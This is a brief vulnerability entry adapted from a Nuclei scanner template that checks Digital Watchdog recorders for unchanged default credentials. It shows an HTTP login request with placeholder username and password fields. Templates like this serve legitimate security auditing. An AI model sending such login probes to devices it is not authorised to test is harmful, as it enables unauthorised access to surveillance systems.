# Nuclei Template: Digital Watchdog - Default Login
**Template ID:** digital-watchdog-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`digital-watchdog-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Digital Watchdog default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /web/rest/v1/login/sessions HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{user}}","password":"{{pass}}","setCookie":true}
```

## References
- https://digitalwatchdog.happyfox.com/kb/article/686-recorder-and-raid-default-login-list/
